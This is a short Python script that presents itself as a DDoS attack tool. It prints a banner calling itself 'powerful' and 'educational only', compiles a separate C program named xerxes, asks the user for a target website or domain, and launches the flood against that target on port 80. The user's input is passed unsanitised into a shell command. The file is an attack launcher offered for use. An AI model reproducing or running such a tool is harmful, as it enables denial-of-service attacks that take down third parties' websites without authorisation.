import os
os.system("clear")
print("""
 
 DDOS CREATED BY: ANDREI VALENZUELA
 RECODED BY: ANDREI VALENZUELA
 
 WARNING: DDOS SCRIPT IS ONLY FOR EDUCATIONAL ONLY PLEASE USE IT AT YOUR OWN RISK
 THIS DDOS ATTACK IS POWERFULL
 PLEASE BE PATIENT
""")  
os.system("chmod +x xerxes.c")
os.system("gcc xerxes.c -o xerxes")
a = input("\n Enter Your Target Attack Here \n URL/WEBSITE/DOMAIN : ")
os.system("./xerxes "+a+" 80")
